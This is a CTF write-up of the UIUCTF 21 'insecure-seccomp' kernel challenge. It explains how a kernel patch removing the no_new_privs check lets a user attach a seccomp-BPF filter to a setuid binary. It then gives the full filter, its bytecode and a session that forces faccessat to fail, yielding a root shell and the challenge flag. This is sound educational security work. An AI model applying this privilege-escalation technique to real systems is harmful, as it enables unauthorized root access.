# Intro

This writeup is pretty late, given that [UIUCTC
21](https://ctftime.org/event/1372) ended a good few days ago, but now its
here.

This was a first for me, and for my team-mate
[X3eRo0](https://twitter.com/X3eRo0/); a kernel challenge in a live CTF
environment. Although we both finished the kernel section of
[pwn.college](https://pwn.college/) this was a little different, as you'll
see.

## Pre-requisites

This writeup assumes that the reader knows what `seccomp` is, and what it does
along with how it does it. If you don't, reading through the [man
page](https://man7.org/linux/man-pages/man2/seccomp.2.html) a little will help
with that understanding.

## What

The challenge gives us links to a `handout.tar.gz` and `starter.c`. On
extracting the handout, we are greeted with a `challenge` folder, and inside
that folder are the following files:

` Dockerfile  kernel/  nsjail.cfg  src/ `

We are given a `Dockerfile`, `kernel/` directory, an nsjail configuration file
and a `src/` folder. Building this in docker takes a long time, and quite a
lot of disk space so if you want to you can skip that process completely and
just use:

```sh  
stty raw -echo; nc insecure-seccomp.chal.uiuc.tf 1337; stty -raw echo  
```

To connect to the remote service, IF its still up, that is. Anyway, looking in
the dockerfile we can get some details about our challenge before even reading
the source, in particular:

```  
COPY kernel/kconfig /kernel/linux-5.12.14/.config  
COPY kernel/patch /tmp/kernel.patch  
COPY kernel/CVE-2021-33909.patch /tmp/CVE-2021-33909.patch  
RUN patch -p1 -d /kernel/linux-5.12.14 < /tmp/CVE-2021-33909.patch  
RUN patch -p1 -d /kernel/linux-5.12.14 < /tmp/kernel.patch  
```

Here we can see the some files, such as the `kconfig` which contains flags and
build instructions for our kernel, and 2 other files, `patch` and
`CVE-2021-33909.patch`. The latter provides a fix for a recent CVE, and is not
relevant on our end, however the former is a bit more interesting:

```  
diff --git a/init/main.c b/init/main.c  
index 5bd1a25f1d6f..ee7dc4a65c08 100644  
--- a/init/main.c  
+++ b/init/main.c  
@@ -1490,7 +1490,7 @@ void __init console_on_rootfs(void)  
       struct file *file = filp_open("/dev/console", O_RDWR, 0);

       if (IS_ERR(file)) {  
-               pr_err("Warning: unable to open an initial console.\n");  
+               // pr_err("Warning: unable to open an initial console.\n");  
               return;  
       }  
       init_dup(file);  
diff --git a/kernel/seccomp.c b/kernel/seccomp.c  
index 93684cc63285..e8574297803c 100644  
--- a/kernel/seccomp.c  
+++ b/kernel/seccomp.c  
@@ -648,9 +648,9 @@ static struct seccomp_filter
*seccomp_prepare_filter(struct sock_fprog *fprog)  
        * This avoids scenarios where unprivileged tasks can affect the  
        * behavior of privileged children.  
        */  
-       if (!task_no_new_privs(current) &&  
-                       !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))  
-               return ERR_PTR(-EACCES);  
+       // if (!task_no_new_privs(current) &&  
+       //              !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))  
+       //      return ERR_PTR(-EACCES);

       /* Allocate a new seccomp_filter */  
       sfilter = kzalloc(sizeof(*sfilter), GFP_KERNEL | __GFP_NOWARN);  
```

In particular, look closely at these lines:

```  
* This avoids scenarios where unprivileged tasks can affect the  
* behavior of privileged children.  
*/  
-       if (!task_no_new_privs(current) &&  
-                       !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))  
-               return ERR_PTR(-EACCES);  
+       // if (!task_no_new_privs(current) &&  
+       //              !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))  
+       //      return ERR_PTR(-EACCES);  
```

It looks like before our kernel is compiled, the `patch` command is used
comment some lines out, but what is the significance of these lines? Well,
googling `test_no_new_privs()` the first result is
[this](http://bricktou.cn/include/linux/schedtask_no_new_privs_en.html), here
we can see a function prototype and a description for what purpose this has:

```c  
static bool task_no_new_privs(struct task_struct *p)  
```

The description states: `Determine whether a bit is set`. Of course this makes
sense given the function returns a Boolean. Now lets look at the
implementation. The latter also links to a source snipped, however our kernel
version is different, so we can look
[here](https://elixir.bootlin.com/linux/v5.12.14/source/include/linux/sched.h#L1646)
instead:

```c  
/* Per-process atomic flags. */  
#define PFA_NO_NEW_PRIVS                0       /* May not gain new
privileges. */  
#define PFA_SPREAD_PAGE                 1       /* Spread page cache over
cpuset */  
#define PFA_SPREAD_SLAB                 2       /* Spread some slab caches
over cpuset */  
#define PFA_SPEC_SSB_DISABLE            3       /* Speculative Store Bypass
disabled */  
#define PFA_SPEC_SSB_FORCE_DISABLE      4       /* Speculative Store Bypass
force disabled*/  
#define PFA_SPEC_IB_DISABLE             5       /* Indirect branch speculation
restricted */  
#define PFA_SPEC_IB_FORCE_DISABLE       6       /* Indirect branch speculation
permanently restricted */  
#define PFA_SPEC_SSB_NOEXEC             7       /* Speculative Store Bypass
clear on execve() */

#define TASK_PFA_TEST(name, func)                                       \  
	static inline bool task_##func(struct task_struct *p)		\  
	{ return test_bit(PFA_##name, &p->atomic_flags); }

#define TASK_PFA_SET(name, func)                                        \  
	static inline void task_set_##func(struct task_struct *p)	\  
	{ set_bit(PFA_##name, &p->atomic_flags); }

#define TASK_PFA_CLEAR(name, func)                                      \  
	static inline void task_clear_##func(struct task_struct *p)	\  
	{ clear_bit(PFA_##name, &p->atomic_flags); }

TASK_PFA_TEST(NO_NEW_PRIVS, no_new_privs)  
```

Specifically, the definition is on the last line. Doesn't much look like a
function definition, does it? But it gets a bit clearer when you look at the
macro being used:

```c  
#define TASK_PFA_TEST(name, func)                    \  
   static inline bool task_##func(struct task_struct *p)        \  
   { return test_bit(PFA_##name, &p->atomic_flags); }  
```

It takes a `name` and a `func`, then based on that will use even more macros
to stitch together a function name, we pass in `NO_NEW_PRIVS` as our `name`,
and `no_new_privs` as our `func`, and based on that it will give us a function
name of `task_no_new_privs`.

If we look inside the function, we can see that it is, in fact testing a bit.
In this case `PFA_NO_NEW_PRIVS`, or '1'. So what is the purpose of this bit,
exactly?

Again, by googling we can find
[this](https://unix.stackexchange.com/questions/562260/why-we-need-to-set-no-
new-privs-while-before-calling-seccomp-mode-filter) answer on stack overflow.
The gist is:

"The no_new_privs bit is a property of the process which, if set, tells the
kernel to not employ privileges escalation mechanisms like SUID bit (so,
invoking things like sudo(8) will not work at all), so it is safe to allow the
unprivileged process with this bit set to use seccomp filters: this process
will not have any possibility to escalate privileges even temporarily, thus,
will not be able to "hijack" these privileges."

`seccomp` has a lot of features, one of which is the ability to skip a
syscall, and set an arbitrary `ERRNO`/return value from said syscall. Look at
this code, taken from the answer:

```c  
// Make the `openat(2)` syscall always "succeed".  
seccomp_rule_add(seccomp, SCMP_ACT_ERRNO(0), SCMP_SYS(openat), 0);  
```

Once this rule is applied, the `openat` syscall will return '0' regardless of
whether the file in question actually exists. This means that checks in the
program that expect a '-1' on failure will be invalidated and depending on the
depth of error checking may just assume the file exists, when it in fact does
not.

Now with that knowledge we can look back on the patched code from our kernel:

```c  
-       if (!task_no_new_privs(current) &&  
-                       !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))  
-               return ERR_PTR(-EACCES);  
```

So, if the `no_new_privs` bit is NOT set (meaning the process to which the
seccomp rule is being applied IS setuid/running under sudo) AND the current
process was not started by root, `seccomp` will fail before loading the
filter/rule, meaning that no meddling with the return value is possible where
we may have something to gain from it.

But now remember the patch:

```c  
+       // if (!task_no_new_privs(current) &&  
+       //              !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))  
+       //      return ERR_PTR(-EACCES);  
```

This has been undone. Any process, regardless of setuid status will have the
rule applied. This will be incredibly important moving forward, so don't
forget :).

## The challenge

Now that we have covered all that, we can get to the challenge sources. Lets
first take a look at `jail.c`:

```c  
// SPDX-License-Identifier: Apache-2.0  
/*  
* Copyright 2021 Google LLC.  
*/

#define _GNU_SOURCE

#include <grp.h>  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>

int main(int argc, char *argv[]) {  
       if (setgid(1)) {  
               perror("setgid");  
               return 1;  
       }

       if (setgroups(0, NULL)) {  
               perror("setgroups");  
               return 1;  
       }

       if (setuid(1)) {  
               perror("setuid");  
               return 1;  
       }

       putchar('\n');  
       system("/usr/bin/resize > /dev/null");  
       execl("/bin/sh", "sh", NULL);

       perror("execl");  
       return 1;  
}  
```

This isn't particularly special, just know that this is the source for the
shell you receive when you interact with the remote service.  
Now lets look at `seccomp_loader.c`, an interesting name for sure given what
we know about the kernel:

```c  
// SPDX-License-Identifier: Apache-2.0  
/*  
* Copyright 2021 Google LLC.  
*/

#include <errno.h>  
#include <linux/filter.h>  
#include <linux/seccomp.h>  
#include <stdio.h>  
#include <stdlib.h>  
#include <sys/syscall.h>  
#include <unistd.h>

static void perror_exit(char *msg)  
{  
       perror(msg);  
       exit(1);  
}

static int seccomp(unsigned int op, unsigned int flags, void *args)  
{  
       errno = 0;  
       return syscall(SYS_seccomp, op, flags, args);  
}

int main(int argc, char *argv[])  
{  
       unsigned short num_insns;  
       struct sock_filter *insns;  
       struct sock_fprog prog;

       if (argc < 2) {  
               fprintf(stderr, "Usage: %s [command]\n", argv[0]);  
               exit(1);  
       }

       if (scanf("%hu", &num_insns) != 1)  
               goto bad_format;

       insns = calloc(num_insns, sizeof(*insns));  
       if (!insns)  
               perror_exit("calloc");

       for (int i = 0; i < num_insns; i++) {  
               if (scanf(" %hx %hhx %hhx %x",  
                         &insns[i].code,  
                         &insns[i].jt,  
                         &insns[i].jf,  
                         &insns[i].k) != 4)  
                       goto bad_format;  
       }

       prog.len = num_insns;  
       prog.filter = insns;

       if (seccomp(SECCOMP_SET_MODE_FILTER, 0, &prog))  
               perror_exit("seccomp");

       execv(argv[1], &argv[1]);  
       perror_exit("execv");

bad_format:  
       fprintf(stderr, "Bad format\n");  
       return 1;  
}  
```

Whats this then? One of the ways you can apply `seccomp` rules to a program is
via BPF. BPF is a relatively old feature of the Linux kernel, and for our
purposes provides a programmable way to filter syscalls. Its alot deeper than
that; it has its own JIT compiler in the kernel, and is also used across many
projects to provide monitoring and filtering capabilities, but we'll be
focusing specifically on syscall filtering.

Anyway, `seccomp` has `SECCOMP_SET_MODE_FILTER` which we can use to apply BPF
rules the same way we would apply regular rules. Since BPF is JIT compiled in
the kernel, it has its own bytecode architecture; each instruction of this
arch comes packed into a struct:

```c  
struct sock_filter {    /* Filter block */  
       __u16   code;   /* Actual filter code */  
       __u8    jt;     /* Jump true */  
       __u8    jf;     /* Jump false */  
       __u32   k;      /* Generic multiuse field */  
};  
```

You only have to look deep into the abyss if you want to, but you don't
particularly need to if you don't want to, I know I didn't - but if you do,
take a look at:

 - https://www.collabora.com/news-and-blog/blog/2019/04/15/an-BPF-overview-part-2-machine-and-bytecode/  
 - https://www.youtube.com/watch?v=2lbtr85Yrs4

All you need to know is this is how each BPF instruction is formatted. There
is another strange type here, `sock_fprog`:

```c  
struct sock_fprog {     /* Required for SO_ATTACH_FILTER. */  
	unsigned short		len;	/* Number of filter blocks */  
	struct sock_filter __user *filter;  
};  
```

This stores a list/array of `sock_filter`s, and as the name would suggest this
structure is intended to store an entire BPF program, with many instructions.

Next some pretty nice stuff happens:

```c  
if (scanf("%hu", &num_insns) != 1)  
       goto bad_format;

insns = calloc(num_insns, sizeof(*insns));  
if (!insns)  
       perror_exit("calloc");

for (int i = 0; i < num_insns; i++) {  
       if (scanf(" %hx %hhx %hhx %x",  
                 &insns[i].code,  
                 &insns[i].jt,  
                 &insns[i].jf,  
                 &insns[i].k) != 4)  
               goto bad_format;  
}

prog.len = num_insns;  
prog.filter = insns;

if (seccomp(SECCOMP_SET_MODE_FILTER, 0, &prog))  
       perror_exit("seccomp");

execv(argv[1], &argv[1]);  
perror_exit("execv");  
```

Via `scanf()`, were given control over the entire `sock_fprog` and each
`sock_filter`, we can also apply as many instructions as we want, as we
control the `len` field of the struct. Our filter is then applied, and then we
`execv` with our `argv[1]`. What this means is:

 - We control the entire BPF program.  
 - As seccomp filters also apply to children, we may apply this filter to any program we want by adding the path to `argv[1]`  
 - Because of the kernel patch, we can apply this even to setuid binaries.

You would assume, correctly, that BPF has all the capabilities of a regular
seccomp rule/set of rules.

Now, are there any setuid programs here?

```sh  
-r-sr-xr-x    1 0        0            29008 Jul 30 22:20 exploit_me  
```

Yes, yes there is. Shall we take a look next at `exploit_me.c`?

```c  
// SPDX-License-Identifier: Apache-2.0  
/*  
* Copyright 2021 Google LLC.  
*/

#include <assert.h>  
#include <fcntl.h>  
#include <stdio.h>  
#include <unistd.h>

int main(int argc, char *argv[])  
{  
       if (!faccessat(AT_FDCWD, "/flag", R_OK, AT_EACCESS)) {  
               fprintf(stderr, "You can't be root to execute this! ... or can you?\n");  
               return 1;  
       }

       setuid(geteuid());

       execl("/bin/sh", "sh", NULL);  
       perror("execl");  
       return 1;  
}  
```

Pretty simple. If `faccessat` would not access the file `/flag` (or, if it
where to just return a non-zero value) we will get a root shell, and from
there we will be able to `cat /flag`. However how would this work? `faccessat`
*should* always find `/flag`, because it exists? Right?

# Exploitation

This is a little different from what I'm used to, its not really binary
exploitation, but more of a logic bug. Although this isn't necessarily a bad
thing; much less can go wrong when exploiting bugs like this, in fact almost
nothing.

Anyway, exploitation is pretty straightforward:

 1.  Make a BPF filter to 'hook' the `faccessat` syscall, and make it return a nonzero value.  
 2.  Run `exploit_me` under `seccomp_loader` with this filter  
 3.  Get root, cat flag.

When downloading the program, we are given a `starter.c`:

```c  
// SPDX-License-Identifier: MIT  
/*  
* Copyright 2021 Google LLC.  
*/

#include <linux/filter.h>  
#include <linux/seccomp.h>  
#include <stdio.h>  
#include <sys/syscall.h>

int main(int argc, char *argv[])  
{  
	struct sock_filter insns[] = {  
		// Your filter here  
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),  
	};  
	unsigned short num_insns = sizeof(insns) / sizeof(insns[0]);

	printf("%hu\n", num_insns);  
	for (unsigned short i = 0; i < num_insns; i++) {  
		printf("%04hx %02hhx %02hhx %08x\n",  
		       insns[i].code,  
		       insns[i].jt,  
		       insns[i].jf,  
		       insns[i].k);  
	}

	return 0;  
}  
```

Basically we can just slot our filter into the `insns` array, and we will be
given the bytecode for all the instructions in the filter that we can just
slot into `seccomp-loader`, EZ.

X3eRo0 and I (mainly X3eRo0) used [seccomp-
tools](https://github.com/david942j/seccomp-tools) to construct our filter. It
has many features, one of which allows you to program a filter using a custom
language. Heres what our solution looked like:

```  
A = sys_number  
A == faccessat ? lol : done  
lol:  
return ERRNO(5)  
done:  
return ALLOW  
kill:  
return KILL  
```

This, again is pretty simple, at least more simple than using the BPF macros
(lol). All it does is store the syscall number, check if it == faccessat, and
if it does set the return value/errno to 5, effectively causing the syscall to
fail. If we do any other syscall it simply allows it to continue. the `kill`
bit is not used.

You can dump this into BPF bytecode in `seccomp-tools`:

```  
root@nomu:~/D/u/insecure_seccomp  
❯❯ seccomp-tools asm BPF.asm  
"
\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x01\r\x01\x00\x00\x06\x00\x00\x00\x05\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x00\x00"  
```

And X3eRo0 also modified the `starter.c` so that it works with a char* rather
than a list of instructions:

```c  
#include <linux/filter.h>  
#include <linux/seccomp.h>  
#include <stdio.h>  
#include <sys/syscall.h>

int main(int argc, char *argv[])  
{  
       // just paste your filter here  
       char *filters = " \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x01\r\x01\x00\x00\x06\x00\x00\x00\x05\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x00\x00";

       unsigned short num_insns = 5; // just count the number of instructions, we dont care.

       printf("%hu\n", num_insns);  
       for (unsigned short i = 0; i < num_insns; i++) {  
               printf("%04hx %02hhx %02hhx %08x\n",  
                      ((struct sock_filter*)filters)[i].code,  
                      ((struct sock_filter*)filters)[i].jt,  
                      ((struct sock_filter*)filters)[i].jf,  
                      ((struct sock_filter*)filters)[i].k);  
       }

       return 0;  
}

```

Now when you compile+run `starter`, you should get your output as BPF
bytecode:

```  
root@nomu:~/D/u/insecure_seccomp  
❯❯ ./starter  
5  
0020 00 00 00000000  
0015 00 01 0000010d  
0006 00 00 00050005  
0006 00 00 7fff0000  
0006 00 00 00000000  
```

Now when you send this on the remote service, while running `exploit_me`:

```  
/usr/local/bin $ ./seccomp_loader ./exploit_me  
5  
0020 00 00 00000000  
0015 00 01 0000010d  
0006 00 00 00050005  
0006 00 00 7fff0000  
0006 00 00 00000000  
/usr/local/bin # cat /flag  
uiuctf{seccomp_plus_new_privs_equals_inseccomp_e84609bf}  
/usr/local/bin #

```

You will get a root shell, and then flag.

# Closing thoughts

Kernel is very complicated. Bold statements only here xD.

This was a pretty cool challenge, X3eRo0 and I both learned alot about BPF. I
hope you did too.

Another lesson: Always `ls -la` to check whether a binary is setuid, and don't
just assume that every shell will have fancy syntax highlighting for you :P
(this confused me for a while, I couldnt spot the setuid binary, lol).

# References

 - https://unix.stackexchange.com/questions/562260/why-we-need-to-set-no-new-privs-while-before-calling-seccomp-mode-filter  
 - https://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html  
 - https://linux.die.net/man/2/openat  
 - https://man7.org/linux/man-pages/man7/capabilities.7.html  
 - http://bricktou.cn/include/linux/schedtask_no_new_privs_en.html  
 - https://elixir.bootlin.com/linux/v5.12.14/source/include/linux/sched.h#L1646  

Original writeup (https://github.com/volticks/CTF-
Writeups/tree/main/UIUCTF%2021/insecure-seccomp).